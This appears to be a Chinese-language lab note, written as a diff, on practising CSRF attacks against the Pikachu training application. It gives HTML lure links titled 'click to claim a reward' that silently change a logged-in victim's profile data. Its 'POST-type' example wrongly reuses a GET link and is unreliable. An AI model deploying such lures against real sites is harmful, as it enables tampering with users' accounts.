@@ -1,0 +1,18 @@
+CSRF-Pikachu-实操
+#CSRF-pikachu-get型，先在攻击机上正常修改参数，F12抓包参数内容，然后创建一个html文件，修改IP为靶机地址，真实场景不需要地址，就填写域名。
+#这里用的是超链接标签，也可以用<script>标签
+<html>
+<body>
+	<a href="http://192.168./pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=12345678922&add=usa&email=chengong@qq.com%40pikachu.com&submit=submit">点击领取福利</a>
+</body>
+</html>
+#然后虚拟机这边正常访问pikachu地址，保持页面，在新开一个页面访问主机的html地址，这时候靶机点击超链接后，原本信息就被成功修改了。
+
+#CSRF-pikachu-post型
+#基本原理同上
+<html>
+<body>
+	<a href="http://192.168./pikachu/vul/csrf/csrfget/csrf_post_edit.php?sex=girl&phonenum=12345678922&add=usa&email=chengong@qq.com%40pikachu.com&submit=submit">点击领取福利</a>
+</body>
+</html>
+#因此可以发现只要用户已登录目标站点，Cookie无额外校验，请求无不可预测的防伪标识就容易遭受CSRF攻击。
